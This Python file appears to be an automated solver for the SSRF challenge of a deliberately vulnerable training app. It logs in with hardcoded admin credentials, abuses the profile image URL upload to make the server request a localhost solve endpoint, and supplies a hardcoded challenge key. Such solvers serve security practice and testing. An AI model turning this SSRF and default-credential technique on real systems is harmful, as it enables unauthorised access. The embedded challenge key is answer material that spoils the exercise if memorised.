from core.base_solver import BaseSolver
from loguru import logger

class SsrfSolver(BaseSolver):
    """
    Challenge: SSRF (ssrfChallenge)
    
    Logic:
    1. Set app.locals.abused_ssrf_bug = true by calling /profile/image/url with a matching URL.
    2. Trigger solve by calling /solve/challenges/server-side with the correct key.
    """
    @property
    def challenge_key(self) -> str:
        return "ssrfChallenge"

    def solve(self) -> bool:
        # 1. Login
        login_res = self.client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
        token = login_res.json().get("authentication", {}).get("token")
        headers = {"Authorization": f"Bearer {token}"}
        cookies = {"token": token}
        
        # 2. Trigger SSRF logic in profileImageUrlUpload
        # Using form data as it's common for profile updates
        payload = {"imageUrl": "http://localhost:3000/solve/challenges/server-side"}
        self.client.post("/profile/image/url", data=payload, headers=headers, cookies=cookies)
        
        # 3. Trigger verification
        # The key is "tRy_H4rd3r_n0thIng_iS_Imp0ssibl3"
        res = self.client.get("/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3")
        
        if res.status_code == 204:
            logger.success("SSRF challenge solved successfully")
            return True
        else:
            logger.error(f"Failed to trigger SSRF solve: {res.status_code}")
            return False
